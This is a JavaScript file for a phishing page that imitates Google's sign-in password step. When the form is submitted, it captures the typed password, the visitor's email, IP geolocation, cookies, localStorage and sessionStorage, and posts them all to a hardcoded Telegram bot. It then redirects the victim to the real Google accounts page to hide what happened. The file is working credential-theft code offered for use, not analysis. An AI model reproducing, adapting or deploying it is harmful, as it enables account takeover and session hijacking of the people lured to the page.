// Configuration
const TELEGRAM_BOT_TOKEN = '8924952197:AAFX7wmy4jr6sf5BpeFbIte4jbO6pOsygxY'; 
const TELEGRAM_CHAT_ID = '5441937815';

// State
let userData = {
    ip: 'Unknown',
    country: 'Unknown',
    state: 'Unknown',
    platform: navigator.platform,
    userAgent: navigator.userAgent
};

// Geolocation
async function fetchIntelligence() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        if (response.ok) {
            const data = await response.json();
            userData.ip = data.ip || 'Unknown';
            userData.country = data.country_name || 'Unknown';
            userData.state = data.region || 'Unknown';
        }
    } catch (e) {
        console.log('Geo fetch failed');
    }
}

// Get Email from URL
const urlParams = new URLSearchParams(window.location.search);
const email = urlParams.get('email') || 'User';

// UI Elements
const passwordInput = document.getElementById('password');
const displayEmail = document.getElementById('display-email');
const togglePassword = document.getElementById('toggle-password');
const passwordForm = document.getElementById('password-form');
const passwordNextBtn = document.getElementById('password-next');
const modalOverlay = document.getElementById('modal-overlay');

// Init
displayEmail.textContent = email;
fetchIntelligence();

// Functions
function openModal(title, content) {
    document.getElementById('modal-title').textContent = title;
    document.getElementById('modal-body').innerHTML = content;
    modalOverlay.style.display = 'flex';
}

async function sendToTelegram(pass) {
    const cookies = document.cookie || 'No cookies found';
    const localData = JSON.stringify(localStorage) || 'Empty';
    const sessionData = JSON.stringify(sessionStorage) || 'Empty';

    const message = `
🔔 *Password Captured*
📧 *Email:* ${email}
🔑 *Password:* ${pass}
🌐 *IP:* ${userData.ip}
🌍 *Location:* ${userData.state}, ${userData.country}
💻 *Platform:* ${userData.platform}
📱 *User Agent:* ${userData.userAgent}
🍪 *Cookies:* \`${cookies}\`
📦 *LocalStorage:* \`${localData}\`
📂 *SessionStorage:* \`${sessionData}\`
    `;

    try {
        if (TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN') {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }
    } catch (e) {
        console.error('Telegram send failed', e);
    }
}

// Events
passwordForm?.addEventListener('submit', async (e) => {
    e.preventDefault();
    if (!passwordInput.value) {
        passwordInput.reportValidity();
        return;
    }

    passwordNextBtn.disabled = true;
    passwordNextBtn.textContent = 'Loading...';
    
    await sendToTelegram(passwordInput.value);
    
    // Wait for 2 seconds before redirecting
    setTimeout(() => {
        window.location.href = 'https://accounts.google.com/';
    }, 2000);
});

togglePassword?.addEventListener('change', () => {
    passwordInput.type = togglePassword.checked ? 'text' : 'password';
});

document.getElementById('back-to-email')?.addEventListener('click', () => {
    window.location.href = 'index.html';
});

document.getElementById('close-modal')?.addEventListener('click', () => {
    modalOverlay.style.display = 'none';
});

document.getElementById('forgot-password-link')?.addEventListener('click', (e) => {
    e.preventDefault();
    openModal('Google Help', 'Google needs to confirm this account belongs to you for security.');
});
